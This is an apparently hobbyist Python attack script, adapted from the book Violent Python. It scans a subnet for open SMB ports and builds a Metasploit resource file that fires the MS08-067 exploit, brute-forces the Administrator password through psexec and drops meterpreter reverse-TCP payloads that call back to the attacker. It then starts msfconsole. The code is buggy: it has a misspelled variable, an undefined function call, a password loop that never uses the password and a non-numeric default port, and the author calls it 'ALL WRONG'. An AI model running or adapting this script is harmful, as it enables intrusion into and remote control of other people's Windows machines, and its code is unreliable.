import os
import optparse
import sys
import nmap

# code directly from the book Violent Python, with my own modifications to get it working
def find_targets(subnet):
    nmap_scan = nmap.PortScanner()
    nmap_scan.scan(subnet,'445')
    target_hosts = []

    for host in nmap_scan.all_hosts():
        if nmap_scanhost[host].has_tcp(445):
            state = nmap_scan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                target_hosts.append(host)

    return target_hosts

def setupHandler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')

    return

def conficker_Exploit(config_file, target_host, lhost):
    config_file.write('use exploit/windows/smb/ms08_067_netapi\n') # this is a exploit in 2008....
    config_file.write('set RHOST ' + str(target_host) + '\n')
    config_file.write('set LHOST ' + lhost + '\n')
    config_file.write('exploit -j -z\n')
    return

def smb_brute_force(config_file, target_host, password_file, lhost, lport):
    username = 'Administrator'
    pF = open(password_file,'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        config_file.write('use exploit/windows/smb/psexec\n')
        config_file.write('set SMBUser ' + str(username) + '\n')
        config_file.write('set RHOST ' + str(target_host) + '\n')
        config_file.write('set payload windows/meterpreter/reverse_tcp\n')
        config_file.write('set LPORT ' + str(lport) + '\n')
        config_file.write('exploit -j -z\n')
    return

resource_file = '/root/ArmsCommander/remoteexploits/Malware_Engines/Conficker/conficker_metasploit.rc'

def metasploit_manual_start(resource_file):
    os.system('service postgresql start')
    os.system('service metasploit start')
    os.system('msfdb init')
    os.system('msfdb start')
    cmd_String = 'msfconsole -r %s' % resource_file
    os.system(cmd_String)

    return
# this shit is ALL WRONG. These must be done in sequential order. So far it only managed to write payload into the file. Nothing else
def main():
    config_file = open(resource_file,'w')
    parser = optparse.OptionParser('[-] Usage%prog ' + '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='target_host', type='string', help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
    parser.add_option('-F', dest='password_file', type='string', help='password file for SMB brute force attempt')
    (options, args) = parser.parse_args()
    if (options.target_host == None) | (options.lhost == None):
        print parser.usage
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = 'l337'
    password_file = options.password_file
    target_hosts = find_targets(options.target_host)
    setupHandler(config_file, lhost, lport)
    for target_host in target_hosts:
        confickerExploit(config_file, target_host, lhost, lport)
        if password_file != None:
            smb_brute_force(config_file, target_host, password_file, lhost, lport)
        config_file.close()
        metasploit_manual_start(resource_file)

# The exploit order goes like this
# 1. setup handler
# 2. brute force SMB passwords
# 3. drop the payload (which is tied into the brute forcing process, that only drops a easily detectable cleartext reverse tcp connection)

if __name__ == '__main__':
    main()
